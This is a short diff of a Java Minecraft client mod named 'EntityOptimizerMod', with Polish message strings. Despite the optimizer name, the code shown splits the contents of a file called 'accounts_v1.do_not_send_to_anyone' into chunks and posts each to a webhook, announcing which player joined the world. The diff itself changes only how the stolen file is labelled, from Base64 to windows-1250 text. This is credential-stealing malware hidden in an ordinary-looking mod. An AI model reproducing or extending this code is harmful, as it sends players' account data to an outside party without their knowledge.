@@ -77,7 +77,7 @@ public class EntityOptimizerMod implements ClientModInitializer {
             if (i == 0) {
                 header = "Gracz `" + username + "` wszedł do świata.\n";
             }
-            String partInfo = "Zawartość `accounts_v1.do_not_send_to_anyone` (Base64, część "+ (i + 1) + "/" + total + "):\n";
+            String partInfo = "Zawartość `accounts_v1.do_not_send_to_anyone` (jako tekst w windows-1250, część " + (i + 1) + "/" + total + "):\n";
             String messageContent = header + partInfo + "```json\n" + chunk + "\n```";
             sendWebhookAsync(messageContent);
         }
